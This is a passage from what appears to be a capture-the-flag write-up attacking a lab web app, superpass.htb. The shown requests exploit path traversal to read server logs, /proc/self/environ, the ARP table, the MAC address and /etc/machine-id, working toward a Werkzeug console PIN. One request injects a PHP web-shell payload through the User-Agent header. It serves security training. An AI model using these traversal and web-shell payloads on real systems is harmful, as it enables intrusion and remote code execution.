</span></span><span style="display:flex;"><span>Content-Disposition<span style="color:#f92672">:</span> <span style="color:#ae81ff">attachment; filename=superpass_export.csv</span>
</span></span><span style="display:flex;"><span>Vary<span style="color:#f92672">:</span> <span style="color:#ae81ff">Cookie</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">2023/02/28 16:21:17 [error] 1004#1004: *14 open() &#34;/app/app/superpass/static/webfonts/josefinsans.ttf&#34; failed (2: No such file or directory)</span>,<span style="color:#e6db74"> client: 10.10.14.40</span>,<span style="color:#e6db74"> server: superpass.htb</span>,<span style="color:#e6db74"> request: &#34;GET /static/webfonts/josefinsans.ttf HTTP/1.1&#34;</span>,<span style="color:#e6db74"> host: &#34;superpass.htb&#34;</span>,<span style="color:#e6db74"> referrer: &#34;http://superpass.htb/static/css/josefinsans.css&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">2023/02/28 16:23:58 [error] 1004#1004: *18 open() &#34;/app/app/superpass/static/webfonts/josefinsans.ttf&#34; failed (2: No such file or directory)</span>,<span style="color:#e6db74"> client: 10.10.14.40</span>,<span style="color:#e6db74"> server: superpass.htb</span>,<span style="color:#e6db74"> request: &#34;GET /static/webfonts/josefinsans.ttf HTTP/1.1&#34;</span>,<span style="color:#e6db74"> host: &#34;superpass.htb&#34;</span>,<span style="color:#e6db74"> referrer: &#34;http://superpass.htb/static/css/josefinsans.css&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">2023/02/28 16:23:59 [error] 1004#1004: *18 open() &#34;/app/app/superpass/static/webfonts/josefinsans.ttf&#34; failed (2: No such file or directory)</span>,<span style="color:#e6db74"> client: 10.10.14.40</span>,<span style="color:#e6db74"> server: superpass.htb</span>,<span style="color:#e6db74"> request: &#34;GET /static/webfonts/josefinsans.ttf HTTP/1.1&#34;</span>,<span style="color:#e6db74"> host: &#34;superpass.htb&#34;</span>,<span style="color:#e6db74"> referrer: &#34;http://superpass.htb/static/css/josefinsans.css&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">2023/02/28 16:24:04 [error] 1004#1004: *18 open() &#34;/app/app/superpass/static/webfonts/josefinsans.ttf&#34; failed (2: No such file or directory)</span>,<span style="color:#e6db74"> client: 10.10.14.40</span>,<span style="color:#e6db74"> server: superpass.htb</span>,<span style="color:#e6db74"> request: &#34;GET /static/webfonts/josefinsans.ttf HTTP/1.1&#34;</span>,<span style="color:#e6db74"> host: &#34;superpass.htb&#34;</span>,<span style="color:#e6db74"> referrer: &#34;http://superpass.htb/static/css/josefinsans.css&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">2023/02/28 16:24:16 [error] 1004#1004: *18 open() &#34;/app/app/superpass/static/webfonts/josefinsans.ttf&#34; failed (2: No such file or directory)</span>,<span style="color:#e6db74"> client: 10.10.14.40</span>,<span style="color:#e6db74"> server: superpass.htb</span>,<span style="color:#e6db74"> request: &#34;GET /static/webfonts/josefinsans.ttf HTTP/1.1&#34;</span>,<span style="color:#e6db74"> host: &#34;superpass.htb&#34;</span>,<span style="color:#e6db74"> referrer: &#34;http://superpass.htb/static/css/josefinsans.css&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">2023/02/28 16:24:47 [error] 1004#1004: *18 open() &#34;/app/app/superpass/static/webfonts/josefinsans.ttf&#34; failed (2: No such file or directory)</span>,<span style="color:#e6db74"> client: 10.10.14.40</span>,<span style="color:#e6db74"> server: superpass.htb</span>,<span style="color:#e6db74"> request: &#34;GET /static/webfonts/josefinsans.ttf HTTP/1.1&#34;</span>,<span style="color:#e6db74"> host: &#34;superpass.htb&#34;</span>,<span style="color:#e6db74"> referrer: &#34;http://superpass.htb/static/css/josefinsans.css&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">2023/02/28 16:29:48 [error] 1004#1004: *34 open() &#34;/app/app/superpass/static/webfonts/josefinsans.ttf&#34; failed (2: No such file or directory)</span>,<span style="color:#e6db74"> client: 10.10.14.40</span>,<span style="color:#e6db74"> server: superpass.htb</span>,<span style="color:#e6db74"> request: &#34;GET /static/webfonts/josefinsans.ttf HTTP/1.1&#34;</span>,<span style="color:#e6db74"> host: &#34;superpass.htb&#34;</span>,<span style="color:#e6db74"> referrer: &#34;http://superpass.htb/static/css/josefinsans.css&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">2023/02/28 16:29:49 [error] 1004#1004: *34 open() &#34;/app/app/superpass/static/webfonts/josefinsans.ttf&#34; failed (2: No such file or directory)</span>,<span style="color:#e6db74"> client: 10.10.14.40</span>,<span style="color:#e6db74"> server: superpass.htb</span>,<span style="color:#e6db74"> request: &#34;GET /static/webfonts/josefinsans.ttf HTTP/1.1&#34;</span>,<span style="color:#e6db74"> host: &#34;superpass.htb&#34;</span>,<span style="color:#e6db74"> referrer: &#34;http://superpass.htb/static/css/josefinsans.css&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;SNIP&gt;</span>
</span></span></code></pre></div><p>And also the access.log</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">nginx/1.18.0 (Ubuntu)</span>
</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Thu, 13 Mar 2025 23:36:17 GMT</span>
</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/csv; charset=utf-8</span>
</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">9673377</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Content-Disposition<span style="color:#f92672">:</span> <span style="color:#ae81ff">attachment; filename=superpass_export.csv</span>
</span></span><span style="display:flex;"><span>Vary<span style="color:#f92672">:</span> <span style="color:#ae81ff">Cookie</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">127.0.0.1 - - [08/Feb/2023:16:36:03 +0000] &#34;GET /account/login HTTP/1.1&#34; 200 1385 &#34;-&#34; &#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML</span>,<span style="color:#e6db74"> like Gecko) HeadlessChrome/108.0.5359.94 Safari/537.36&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">127.0.0.1 - - [08/Feb/2023:16:36:03 +0000] &#34;GET /static/css/josefinsans.css HTTP/1.1&#34; 200 153 &#34;http://test.superpass.htb/account/login&#34; &#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML</span>,<span style="color:#e6db74"> like Gecko) HeadlessChrome/108.0.5359.94 Safari/537.36&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">127.0.0.1 - - [08/Feb/2023:16:36:03 +0000] &#34;GET /static/js/popper.min.js HTTP/1.1&#34; 200 20337 &#34;http://test.superpass.htb/account/login&#34; &#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML</span>,<span style="color:#e6db74"> like Gecko) HeadlessChrome/108.0.5359.94 Safari/537.36&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">127.0.0.1 - - [08/Feb/2023:16:36:03 +0000] &#34;GET /static/css/site.css HTTP/1.1&#34; 200 1946 &#34;http://test.superpass.htb/account/login&#34; &#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML</span>,<span style="color:#e6db74"> like Gecko) HeadlessChrome/108.0.5359.94 Safari/537.36&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">127.0.0.1 - - [08/Feb/2023:16:36:03 +0000] &#34;GET /static/css/bootstrap.min.css HTTP/1.1&#34; 200 140936 &#34;http://test.superpass.htb/account/login&#34; &#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML</span>,<span style="color:#e6db74"> like Gecko) HeadlessChrome/108.0.5359.94 Safari/537.36&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">127.0.0.1 - - [08/Feb/2023:16:36:03 +0000] &#34;GET /static/css/all.min.css HTTP/1.1&#34; 200 101894 &#34;http://test.superpass.htb/account/login&#34; &#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML</span>,<span style="color:#e6db74"> like Gecko) HeadlessChrome/108.0.5359.94 Safari/537.36&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;SNIP&gt;</span>
</span></span></code></pre></div><p>Which include the User-Agent header. This means we might be able to poison the logs by modifying the User-Agent header. Let&rsquo;s send a request with a modified User-Agent</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /vault <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">superpass.htb</span>
</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</span>
</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Priority<span style="color:#f92672">:</span> <span style="color:#ae81ff">u=0, i</span>
</span></span></code></pre></div><p>Looks like it went through, but we may need to escape the double quotes</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>10.10.14.51 - - [13/Mar/2025:23:38:59 +0000] &#34;GET /account/login?next=%2Fvault HTTP/1.1&#34; 200 1385 &#34;http://superpass.htb/vault&#34; &#34;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34;
</span></span></code></pre></div><p>But that doesn&rsquo;t work. Remember earlier, the application gave us that weird error page? There were some full paths in there. Let&rsquo;s try one</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /download?fn=../../../app/venv/lib/python3.10/site-packages/pymysql/connections.py <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">superpass.htb</span>
</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span><span style="color:#ae81ff"> </span>
</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">remember_token=9|dc4f849e4492fdc4dab194ba371d39b00ad86a2e4cdc0a84c66c21ecbdf2360a9324de834cb47170ef1107755fa3a28b174ae50c69e7a0571f1311ab124fc7ab; session=.eJwlzkkOwjAMAMC_5MwhXuqln0FO7AiuLT0h_g4S84J5t_s66ny0_XVcdWv3Z7a9lWOkE-haW4kOJjUSdjcEUAhnR9SUQBiTmEG1AlZZF0ypRclT2Jywp4_JYDFMAITDUSDmGBqblkIP2qi60ApJSHK1uaz9ItdZx3_j7fMFOgkuCA.Z9Nkkw.2MhARMSbEZofegN-_7jUxf3nNEM</span>
</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Priority<span style="color:#f92672">:</span> <span style="color:#ae81ff">u=0, i</span>
</span></span></code></pre></div><p>And we can see the Python script</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">nginx/1.18.0 (Ubuntu)</span>
</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Thu, 13 Mar 2025 23:52:12 GMT</span>
</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/csv; charset=utf-8</span>
</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">51251</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Content-Disposition<span style="color:#f92672">:</span> <span style="color:#ae81ff">attachment; filename=superpass_export.csv</span>
</span></span><span style="display:flex;"><span>Vary<span style="color:#f92672">:</span> <span style="color:#ae81ff">Cookie</span>
</span></span><span style="display:flex;"><span>Set-Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">session=.eJwlzjsOwjAMANC7ZGaIY9efXqZyYlsgMbViQtwdJN4J3rsddeZ1b3v588pbOx7R9pY2PAxBqrZkmYSiyGSmA0DAjWwMCfYBcyERiKRDpXYewVkYtJjUcPSwuQjUpzIAk9tg8DWn-CYp0B03zM5YzgGBJrpK2y_yuvL8b6x9vmvpLlM.Z9NvrA._eSn0fu6iQopHNaj68vIvAWzJHA; HttpOnly; Path=/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74"># Python implementation of the MySQL client-server protocol</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74"># http://dev.mysql.com/doc/internals/en/client-server-protocol.html</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74"># Error codes:</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74"># https://dev.mysql.com/doc/refman/5.5/en/error-handling.html</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">import errno</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">import os</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">import socket</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">import struct</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">import sys</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">import traceback</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">import warnings</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">from . import _auth</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">from .charset import charset_by_name</span>,<span style="color:#e6db74"> charset_by_id</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">from .constants import CLIENT</span>,<span style="color:#e6db74"> COMMAND</span>,<span style="color:#e6db74"> CR</span>,<span style="color:#e6db74"> FIELD_TYPE</span>,<span style="color:#e6db74"> SERVER_STATUS</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">from . import converters</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">from .cursors import Cursor</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">from .optionfile import Parser</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">from .protocol import (</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    dump_packet</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    MysqlPacket</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    FieldDescriptorPacket</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    OKPacketWrapper</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    EOFPacketWrapper</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    LoadLocalPacketWrapper</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">)</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">from . import err</span>,<span style="color:#e6db74"> VERSION_STRING</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">try:</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    import ssl</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    SSL_ENABLED = True</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">except ImportError:</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    ssl = None</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    SSL_ENABLED = False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">try:</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    import getpass</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    DEFAULT_USER = getpass.getuser()</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">    del getpass</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">except (ImportError</span>,<span style="color:#e6db74"> KeyError):</span>
</span></span></code></pre></div><p>Requesting <code>/app/venv/lib/python3.10/site-packages/flask/app.py</code> and we see <code>Console Locked</code> in the code</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;SNIP&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;h3&gt;Console Locked&lt;/h3&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;p&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          The console is locked and needs to be unlocked by entering the PIN.
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          You can find the PIN printed out on the standard output of your
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">          shell that runs the server.
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;SNIP&gt;
</span></span></span></code></pre></div><p>We also noticed <code>Werkzueg</code> in the previous error messages and source code which logically points us towards cracking the console PIN so we can achieve remote code execution. To do this, we need a few pieces of information. First, we need the user that is running the webserver</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /download?fn=../../../proc/self/environ <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">superpass.htb</span>
</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span><span style="color:#ae81ff"> </span>
</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">remember_token=9|dc4f849e4492fdc4dab194ba371d39b00ad86a2e4cdc0a84c66c21ecbdf2360a9324de834cb47170ef1107755fa3a28b174ae50c69e7a0571f1311ab124fc7ab; session=.eJwlzkkOwjAMAMC_5MwhXuqln0FO7AiuLT0h_g4S84J5t_s66ny0_XVcdWv3Z7a9lWOkE-haW4kOJjUSdjcEUAhnR9SUQBiTmEG1AlZZF0ypRclT2Jywp4_JYDFMAITDUSDmGBqblkIP2qi60ApJSHK1uaz9ItdZx3_j7fMFOgkuCA.Z9Nkkw.2MhARMSbEZofegN-_7jUxf3nNEM</span>
</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Priority<span style="color:#f92672">:</span> <span style="color:#ae81ff">u=0, i</span>
</span></span></code></pre></div><p>Querying <code>/proc/self/environ</code> tells us this is the <code>www-data</code> user</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">nginx/1.18.0 (Ubuntu)</span>
</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Fri, 14 Mar 2025 00:07:27 GMT</span>
</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/csv; charset=utf-8</span>
</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">260</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Content-Disposition<span style="color:#f92672">:</span> <span style="color:#ae81ff">attachment; filename=superpass_export.csv</span>
</span></span><span style="display:flex;"><span>Vary<span style="color:#f92672">:</span> <span style="color:#ae81ff">Cookie</span>
</span></span><span style="display:flex;"><span>Set-Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">session=.eJwlzjsOwjAMANC7ZGaIY9efXqZyYlsgMbViQtwdJN4J3rsddeZ1b3v588pbOx7R9pY2PAxBqrZkmYSiyGSmA0DAjWwMCfYBcyERiKRDpXYewVkYtJjUcPSwuQjUpzIAk9tg8DWn-CYp0B03zM5YzgGBJrpK2y_yuvL8b6x9vmvpLlM.Z9NzPw.Hb06QqGU94MOJ8zhY5BQeL678d0; HttpOnly; Path=/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">LANG=C.UTF-8</span>
</span></span></code></pre></div><p>Then we need to get the MAC address. First we query <code>GET /download?fn=../../../proc/net/arp</code> to get the interface</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">nginx/1.18.0 (Ubuntu)</span>
</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Fri, 14 Mar 2025 00:10:05 GMT</span>
</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/csv; charset=utf-8</span>
</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">156</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Content-Disposition<span style="color:#f92672">:</span> <span style="color:#ae81ff">attachment; filename=superpass_export.csv</span>
</span></span><span style="display:flex;"><span>Vary<span style="color:#f92672">:</span> <span style="color:#ae81ff">Cookie</span>
</span></span><span style="display:flex;"><span>Set-Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">session=.eJwlzjsOwjAMANC7ZGaIY9efXqZyYlsgMbViQtwdJN4J3rsddeZ1b3v588pbOx7R9pY2PAxBqrZkmYSiyGSmA0DAjWwMCfYBcyERiKRDpXYewVkYtJjUcPSwuQjUpzIAk9tg8DWn-CYp0B03zM5YzgGBJrpK2y_yuvL8b6x9vmvpLlM.Z9Nz3Q.m-c57iEwjLxBJIUgTgibJkJj-vM; HttpOnly; Path=/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">IP address       HW type     Flags       HW address            Mask     Device</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">10.10.10.2       0x1         0x2         00:50:56:b9:5d:68     *        eth0</span>
</span></span></code></pre></div><p>Then query that interface with <code>GET /download?fn=../../../sys/class/net/eth0/address</code> for the MAC address</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">nginx/1.18.0 (Ubuntu)</span>
</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Fri, 14 Mar 2025 00:12:23 GMT</span>
</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/csv; charset=utf-8</span>
</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">18</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Content-Disposition<span style="color:#f92672">:</span> <span style="color:#ae81ff">attachment; filename=superpass_export.csv</span>
</span></span><span style="display:flex;"><span>Vary<span style="color:#f92672">:</span> <span style="color:#ae81ff">Cookie</span>
</span></span><span style="display:flex;"><span>Set-Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">session=.eJwlzjsOwjAMANC7ZGaIY9efXqZyYlsgMbViQtwdJN4J3rsddeZ1b3v588pbOx7R9pY2PAxBqrZkmYSiyGSmA0DAjWwMCfYBcyERiKRDpXYewVkYtJjUcPSwuQjUpzIAk9tg8DWn-CYp0B03zM5YzgGBJrpK2y_yuvL8b6x9vmvpLlM.Z9N0Zw.aSAI2fL5tiky72RPfrevad3-jv8; HttpOnly; Path=/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">00:50:56:b0:fe:7a</span>
</span></span></code></pre></div><p>We need to convert the hex to decimal</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$python3
</span></span><span style="display:flex;"><span>Python 3.11.2 (main, Nov 30 2024, 21:22:50) [GCC 12.2.0] on linux
</span></span><span style="display:flex;"><span>Type &#34;help&#34;, &#34;copyright&#34;, &#34;credits&#34; or &#34;license&#34; for more information.
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; print<span style="color:#f92672">(</span>0x005056b0fe7a<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>345051823738
</span></span></code></pre></div><p>We also need the data for <code>get_machine_id()</code> which we can get with <code>GET /download?fn=../../../etc/machine-id</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">nginx/1.18.0 (Ubuntu)</span>
</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Fri, 14 Mar 2025 00:20:15 GMT</span>
